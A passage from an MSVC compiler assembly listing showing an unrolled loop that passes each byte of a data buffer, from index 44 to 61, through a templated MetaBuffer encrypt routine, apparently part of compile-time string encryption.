  00757	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0075c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00763	88 41 2c	 mov	 BYTE PTR [rcx+44], al
  00766	b8 01 00 00 00	 mov	 eax, 1
  0076b	48 6b c0 2c	 imul	 rax, rax, 44		; 0000002cH
  0076f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00776	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0077a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00781	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00786	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0078d	88 41 2d	 mov	 BYTE PTR [rcx+45], al
  00790	b8 01 00 00 00	 mov	 eax, 1
  00795	48 6b c0 2d	 imul	 rax, rax, 45		; 0000002dH
  00799	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007a0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007a4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ab	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007b7	88 41 2e	 mov	 BYTE PTR [rcx+46], al
  007ba	b8 01 00 00 00	 mov	 eax, 1
  007bf	48 6b c0 2e	 imul	 rax, rax, 46		; 0000002eH
  007c3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007ca	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007ce	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007d5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  007da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007e1	88 41 2f	 mov	 BYTE PTR [rcx+47], al
  007e4	b8 01 00 00 00	 mov	 eax, 1
  007e9	48 6b c0 2f	 imul	 rax, rax, 47		; 0000002fH
  007ed	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  007f4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  007f8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  007ff	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00804	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0080b	88 41 30	 mov	 BYTE PTR [rcx+48], al
  0080e	b8 01 00 00 00	 mov	 eax, 1
  00813	48 6b c0 30	 imul	 rax, rax, 48		; 00000030H
  00817	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0081e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00822	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00829	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0082e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00835	88 41 31	 mov	 BYTE PTR [rcx+49], al
  00838	b8 01 00 00 00	 mov	 eax, 1
  0083d	48 6b c0 31	 imul	 rax, rax, 49		; 00000031H
  00841	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00848	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0084c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00853	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00858	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0085f	88 41 32	 mov	 BYTE PTR [rcx+50], al
  00862	b8 01 00 00 00	 mov	 eax, 1
  00867	48 6b c0 32	 imul	 rax, rax, 50		; 00000032H
  0086b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00872	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00876	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0087d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00882	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00889	88 41 33	 mov	 BYTE PTR [rcx+51], al
  0088c	b8 01 00 00 00	 mov	 eax, 1
  00891	48 6b c0 33	 imul	 rax, rax, 51		; 00000033H
  00895	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0089c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008a0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008a7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008ac	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008b3	88 41 34	 mov	 BYTE PTR [rcx+52], al
  008b6	b8 01 00 00 00	 mov	 eax, 1
  008bb	48 6b c0 34	 imul	 rax, rax, 52		; 00000034H
  008bf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008c6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008ca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008d1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  008d6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008dd	88 41 35	 mov	 BYTE PTR [rcx+53], al
  008e0	b8 01 00 00 00	 mov	 eax, 1
  008e5	48 6b c0 35	 imul	 rax, rax, 53		; 00000035H
  008e9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  008f0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  008f4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  008fb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00900	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00907	88 41 36	 mov	 BYTE PTR [rcx+54], al
  0090a	b8 01 00 00 00	 mov	 eax, 1
  0090f	48 6b c0 36	 imul	 rax, rax, 54		; 00000036H
  00913	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0091a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0091e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00925	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0092a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00931	88 41 37	 mov	 BYTE PTR [rcx+55], al
  00934	b8 01 00 00 00	 mov	 eax, 1
  00939	48 6b c0 37	 imul	 rax, rax, 55		; 00000037H
  0093d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00944	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00948	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0094f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00954	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0095b	88 41 38	 mov	 BYTE PTR [rcx+56], al
  0095e	b8 01 00 00 00	 mov	 eax, 1
  00963	48 6b c0 38	 imul	 rax, rax, 56		; 00000038H
  00967	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0096e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00972	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00979	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  0097e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00985	88 41 39	 mov	 BYTE PTR [rcx+57], al
  00988	b8 01 00 00 00	 mov	 eax, 1
  0098d	48 6b c0 39	 imul	 rax, rax, 57		; 00000039H
  00991	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00998	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0099c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009a3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009a8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009af	88 41 3a	 mov	 BYTE PTR [rcx+58], al
  009b2	b8 01 00 00 00	 mov	 eax, 1
  009b7	48 6b c0 3a	 imul	 rax, rax, 58		; 0000003aH
  009bb	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009c2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009c6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009cd	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009d2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009d9	88 41 3b	 mov	 BYTE PTR [rcx+59], al
  009dc	b8 01 00 00 00	 mov	 eax, 1
  009e1	48 6b c0 3b	 imul	 rax, rax, 59		; 0000003bH
  009e5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  009ec	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  009f0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  009f7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  009fc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a03	88 41 3c	 mov	 BYTE PTR [rcx+60], al
  00a06	b8 01 00 00 00	 mov	 eax, 1
  00a0b	48 6b c0 3c	 imul	 rax, rax, 60		; 0000003cH
  00a0f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a16	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a21	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$01$0FJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ; MetaBuffer<2,89,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
  00a26	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00a2d	88 41 3d	 mov	 BYTE PTR [rcx+61], al
  00a30	b8 01 00 00 00	 mov	 eax, 1
  00a35	48 6b c0 3d	 imul	 rax, rax, 61		; 0000003dH
  00a39	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00a40	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00a44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
